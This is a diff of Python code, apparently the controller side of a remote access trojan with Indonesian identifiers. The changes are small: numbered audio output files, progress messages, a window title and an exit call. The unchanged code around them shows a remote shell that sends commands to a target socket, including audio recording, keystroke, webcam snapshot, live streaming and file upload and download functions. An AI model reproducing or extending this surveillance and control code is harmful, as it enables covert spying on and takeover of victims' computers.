@@ -81,7 +81,7 @@ CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
 
-def receive_and_save():
+def receive_and_save(WAVE_OUTPUT):
      frames = []
      try:
           with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -96,7 +96,6 @@ def receive_and_save():
                               break
                          frames.append(data)
           print('saving WAV file')
-          WAVE_OUTPUT = 'retrieved_audio.wav'
           with wave.open(WAVE_OUTPUT, 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(2)
@@ -184,7 +183,7 @@ def konversi_byte_stream():
                 bdata =  bdata[msg_size:]
                 frame = pickle.loads(frame_data)
                 cv2.startWindowThread()
-                cv2.imshow("streaming", frame)
+                cv2.imshow("streaming / press Q to quit", frame)
                 key = cv2.waitKey(1)
                 if key & 0xFF == ord('q'):
                     break 
@@ -202,11 +201,13 @@ def upload_file(namafile):
      filesize = os.path.getsize(namafile)
      _target.sendall(struct.pack("Q", filesize))
      with open(namafile, 'rb') as f:
+        print('uploading')
         while True:
             data = f.read(bufsize)
             if not data:
                 break
-            _target.sendall(data)  
+            _target.sendall(data)
+        print('uploaded')  
 
 def download_file(namafile):
      bufsize = 65536
@@ -217,12 +218,14 @@ def download_file(namafile):
           return 
      recv = 0
      with open(namafile, 'wb') as file:
+        print('downloading')
         while recv < filesize:
                 data = _target.recv(bufsize)
                 if not data:
                     break
                 file.write(data)
                 recv += len(data)
+        print('downloaded')
 
 def data_diterima():
         data = ''
@@ -236,6 +239,7 @@ def data_diterima():
 def shellc():
     x = 0                      
     n = 0
+    p = 0
     print("Type 'help' for help")
     while True:
         try:
@@ -243,7 +247,7 @@ def shellc():
           data = json.dumps(perintah)
           _target.send(data.encode())
           if perintah in('exit','quit'):
-              break
+              exit('Exiting')
           elif perintah == 'clear':
              os.system('clear')
           elif perintah[:3] == 'cd ':
@@ -333,7 +337,8 @@ def shellc():
                    
                    """)
           elif perintah == 'rec_audio':
-             receive_and_save()
+             p += 1
+             receive_and_save('retrieved_audio'+str(p)+'.wav')
           elif perintah == 'send_key':
              keystroke()   
           elif perintah == 'snap_cam':
